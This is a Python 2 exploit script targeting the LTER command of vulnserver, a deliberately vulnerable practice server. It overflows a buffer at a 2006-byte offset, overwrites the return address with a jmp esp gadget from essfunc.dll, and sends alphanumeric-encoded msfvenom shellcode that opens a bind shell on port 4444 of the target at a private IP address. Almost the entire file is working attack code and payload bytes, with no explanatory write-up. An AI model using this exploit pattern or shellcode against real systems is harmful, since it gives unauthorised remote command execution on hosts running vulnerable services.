#!/usr/bin/python -w
##################################################################################################################
# Author: Tiago Carvalho 
# vulnserver LTER  Overflow
# buffer size 3000
# ret offset 2006
##################################################################################################################

from struct import pack
import socket
import sys

IP="172.16.206.132"

#msfvenom -p windows/shell_bind_tcp -a x86 --platform windows -e x86/alpha_upper -b '\x00\x0a\x0d' LPORT=4444 BufferRegister=ESP -f c
#Attempting to encode payload with 1 iterations of x86/alpha_upper
#x86/alpha_upper succeeded with size 717 (iteration=0)
#x86/alpha_upper chosen with final size 717
#Payload size: 717 bytes
#Final size of c file: 3036 bytes
shellcode = (
"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x56"
"\x54\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30"
"\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42"
"\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b"
"\x4c\x4d\x38\x4b\x32\x43\x30\x53\x30\x45\x50\x53\x50\x4d\x59"
"\x4d\x35\x36\x51\x59\x50\x43\x54\x4c\x4b\x50\x50\x30\x30\x4c"
"\x4b\x30\x52\x34\x4c\x4c\x4b\x50\x52\x52\x34\x4c\x4b\x54\x32"
"\x31\x38\x44\x4f\x4e\x57\x50\x4a\x56\x46\x56\x51\x4b\x4f\x4e"
"\x4c\x37\x4c\x43\x51\x33\x4c\x55\x52\x46\x4c\x51\x30\x4f\x31"
"\x48\x4f\x34\x4d\x33\x31\x58\x47\x4b\x52\x5a\x52\x46\x32\x31"
"\x47\x4c\x4b\x46\x32\x34\x50\x4c\x4b\x31\x5a\x47\x4c\x4c\x4b"
"\x30\x4c\x44\x51\x52\x58\x4d\x33\x47\x38\x55\x51\x48\x51\x30"
"\x51\x4c\x4b\x31\x49\x31\x30\x55\x51\x39\x43\x4c\x4b\x57\x39"
"\x35\x48\x4b\x53\x37\x4a\x31\x59\x4c\x4b\x36\x54\x4c\x4b\x55"
"\x51\x49\x46\x36\x51\x4b\x4f\x4e\x4c\x59\x51\x48\x4f\x44\x4d"
"\x43\x31\x38\x47\x47\x48\x4d\x30\x33\x45\x4c\x36\x33\x33\x33"
"\x4d\x4a\x58\x57\x4b\x53\x4d\x36\x44\x53\x45\x5a\x44\x50\x58"
"\x4c\x4b\x56\x38\x57\x54\x45\x51\x49\x43\x43\x56\x4c\x4b\x44"
"\x4c\x50\x4b\x4c\x4b\x30\x58\x55\x4c\x35\x51\x39\x43\x4c\x4b"
"\x33\x34\x4c\x4b\x35\x51\x38\x50\x4c\x49\x37\x34\x57\x54\x36"
"\x44\x51\x4b\x31\x4b\x53\x51\x56\x39\x51\x4a\x50\x51\x4b\x4f"
"\x4b\x50\x31\x4f\x31\x4f\x51\x4a\x4c\x4b\x32\x32\x4a\x4b\x4c"
"\x4d\x51\x4d\x45\x38\x57\x43\x30\x32\x43\x30\x53\x30\x43\x58"
"\x32\x57\x44\x33\x36\x52\x31\x4f\x30\x54\x33\x58\x50\x4c\x33"
"\x47\x47\x56\x43\x37\x4b\x4f\x48\x55\x58\x38\x4a\x30\x43\x31"
"\x55\x50\x45\x50\x47\x59\x58\x44\x46\x34\x36\x30\x52\x48\x56"
"\x49\x4b\x30\x52\x4b\x33\x30\x4b\x4f\x49\x45\x42\x4a\x34\x48"
"\x31\x49\x50\x50\x5a\x42\x4b\x4d\x57\x30\x36\x30\x37\x30\x30"
"\x50\x55\x38\x4a\x4a\x54\x4f\x39\x4f\x4b\x50\x4b\x4f\x39\x45"
"\x4a\x37\x45\x38\x44\x42\x45\x50\x42\x31\x31\x4c\x4c\x49\x4a"
"\x46\x32\x4a\x44\x50\x36\x36\x31\x47\x45\x38\x59\x52\x59\x4b"
"\x30\x37\x42\x47\x4b\x4f\x58\x55\x56\x37\x45\x38\x4e\x57\x4d"
"\x39\x47\x48\x4b\x4f\x4b\x4f\x48\x55\x56\x37\x55\x38\x52\x54"
"\x5a\x4c\x47\x4b\x4b\x51\x4b\x4f\x58\x55\x51\x47\x4a\x37\x45"
"\x38\x53\x45\x42\x4e\x50\x4d\x33\x51\x4b\x4f\x4e\x35\x52\x48"
"\x35\x33\x52\x4d\x42\x44\x45\x50\x4d\x59\x4d\x33\x36\x37\x36"
"\x37\x31\x47\x50\x31\x5a\x56\x43\x5a\x35\x42\x36\x39\x30\x56"
"\x4b\x52\x4b\x4d\x55\x36\x58\x47\x50\x44\x37\x54\x37\x4c\x35"
"\x51\x55\x51\x4c\x4d\x57\x34\x47\x54\x52\x30\x39\x56\x55\x50"
"\x37\x34\x31\x44\x36\x30\x46\x36\x51\x46\x30\x56\x57\x36\x46"
"\x36\x30\x4e\x46\x36\x36\x36\x31\x43\x51\x46\x52\x48\x34\x39"
"\x58\x4c\x47\x4f\x4c\x46\x4b\x4f\x4e\x35\x4b\x39\x4b\x50\x50"
"\x4e\x31\x46\x51\x56\x4b\x4f\x56\x50\x33\x58\x35\x58\x4c\x47"
"\x45\x4d\x55\x30\x4b\x4f\x59\x45\x4f\x4b\x4a\x50\x58\x35\x39"
"\x32\x36\x36\x53\x58\x59\x36\x5a\x35\x4f\x4d\x4d\x4d\x4b\x4f"
"\x58\x55\x57\x4c\x34\x46\x53\x4c\x55\x5a\x4b\x30\x4b\x4b\x4b"
"\x50\x32\x55\x45\x55\x4f\x4b\x30\x47\x45\x43\x42\x52\x42\x4f"
"\x52\x4a\x35\x50\x56\x33\x4b\x4f\x49\x45\x41\x41")

##################################################################################################################
# Address=62501203
# Message=  0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfuncdll] 
# ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-10- (C:\sully\sulley\essfuncdll)
# goodchars 0x01 0x7F
##########################################################################################################################

jmp = pack('<L',0x62501203)

payload = "\x41" * 2006 + jmp + shellcode
print "[*]\t payload length: %d" % len(payload)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((IP, 8888))

s.send("LTER ."+ payload + "\r\n")
s.close